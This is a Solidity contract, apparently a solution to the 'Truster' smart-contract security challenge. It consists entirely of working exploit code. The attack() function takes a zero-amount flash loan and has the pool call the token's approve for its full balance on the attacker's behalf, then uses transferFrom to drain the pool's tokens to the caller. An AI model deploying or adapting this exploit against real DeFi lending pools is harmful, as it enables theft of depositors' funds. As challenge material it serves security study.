pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
    external;
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TrusterAttacker {

    address private pool;
    address private token;

    constructor(address poolAddress, address tokenAddress) {
        pool = poolAddress;
        token = tokenAddress;
    }

    function attack() public {
        uint256 amount = IToken(token).balanceOf(pool);

        IPool(pool).flashLoan(0, msg.sender, token, abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                amount
            ));

        IToken(token).transferFrom(pool, msg.sender, amount);
    }
}